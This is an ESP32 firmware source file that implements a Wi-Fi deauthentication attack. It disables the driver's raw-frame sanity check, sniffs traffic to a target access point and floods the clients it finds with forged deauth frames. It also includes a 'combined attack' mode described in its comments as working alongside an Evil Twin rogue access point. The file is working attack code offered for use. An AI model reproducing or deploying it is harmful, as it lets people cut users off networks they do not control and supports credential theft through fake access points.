#include <WiFi.h>
#include <esp_wifi.h>
#include "deauth.h"
#include "config.h"

// Global variables
int eliminated_stations = 0;
bool attack_active = false;
int deauth_type = DEAUTH_TYPE_SINGLE;
deauth_frame_t deauth_frame;

// Target BSSID for combined attack
uint8_t real_target_bssid[6] = {0};
int real_target_channel = 0;

// Packet structure
typedef struct {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t sequence[2];
} wifi_mac_hdr_t;

// Promiscuous filter
wifi_promiscuous_filter_t filt = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
};

// Bypass WiFi sanity check
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// Promiscuous callback (for regular deauth attack)
void IRAM_ATTR sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!attack_active) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    wifi_mac_hdr_t* hdr = (wifi_mac_hdr_t*)pkt->payload;
    
    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        // Check if packet is sent to target AP
        if (memcmp(hdr->addr1, deauth_frame.access_point, 6) == 0) {
            // Found client communicating with target
            memcpy(deauth_frame.station, hdr->addr2, 6);
            
            // Send deauth frames
            for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
                esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
            }
            
            eliminated_stations++;
            DEBUG_PRINTF("Deauthed client: %02X:%02X:%02X:%02X:%02X:%02X\n",
                         hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                         hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
        }
    }
}

void init_deauth() {
    // Initialize deauth frame structure
    memset(&deauth_frame, 0, sizeof(deauth_frame));
    deauth_frame.frame_control[0] = 0xC0; // Deauth frame
    deauth_frame.frame_control[1] = 0x00;
    deauth_frame.reason = 5; // AP too busy
}

// Function to set real target info for combined attack
void set_real_target_info(uint8_t* bssid, int channel) {
    memcpy(real_target_bssid, bssid, 6);
    real_target_channel = channel;
    
    // Set deauth frame for the real target
    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);
}

// Broadcast deauth function for combined attack
// void send_broadcast_deauth() {
//     if (!attack_active) return;
    
//     // Send broadcast deauth to all clients (FF:FF:FF:FF:FF:FF)
//     uint8_t broadcast_addr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
//     memcpy(deauth_frame.station, broadcast_addr, 6);
    
//     // Send multiple deauth frames
//     for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
//         esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
//     }
    
//     eliminated_stations++;
//     DEBUG_PRINTLN("Sent broadcast deauth");
// }

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
    eliminated_stations = 0;
    deauth_type = attack_type;
    attack_active = true;
    
    deauth_frame.reason = reason;
    
    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        // Get target network info
        uint8_t* target_bssid = WiFi.BSSID(wifi_number);
        int channel = WiFi.channel(wifi_number);
        
        // Set target BSSID in deauth frame
        memcpy(deauth_frame.access_point, target_bssid, 6);
        memcpy(deauth_frame.sender, target_bssid, 6);
        
        // Set WiFi channel for the attack
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        DEBUG_PRINTF("Starting attack on: %s (Channel: %d)\n", 
                     WiFi.SSID(wifi_number).c_str(), channel);
        
        // Enable promiscuous mode for regular deauth
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous_rx_cb(&sniffer);
    } else {
        // Deauth all mode
        // Nothing to change here
    }
}

// Special function for combined attack mode

// Special function for combined attack mode
void start_combined_deauth(uint8_t* bssid, int channel) {
    eliminated_stations = 0;
    deauth_type = DEAUTH_TYPE_SINGLE;
    attack_active = true;
    
    deauth_frame.reason = 5; // AP too busy
    
    // Set target to real AP BSSID
    memcpy(deauth_frame.access_point, bssid, 6);
    memcpy(deauth_frame.sender, bssid, 6);
    
    // Store real target info
    set_real_target_info(bssid, channel);
    
    // ⚠️ IMPORTANT: We CANNOT set channel here because ESP32 is in AP mode
    // The Evil Twin already set the channel during startEvilTwin()
    // Trying to set channel here will conflict with AP mode
    
    DEBUG_PRINTF("Starting combined deauth on real AP (Channel: %d)\n", channel);
    
    // IMPORTANT: Don't enable promiscuous mode in combined attack
    // because ESP32 can't sniff while in AP mode
    esp_wifi_set_promiscuous(false);
}

void stop_deauth() {
    attack_active = false;
    esp_wifi_set_promiscuous(false);
    DEBUG_PRINTLN("Deauth attack stopped");
}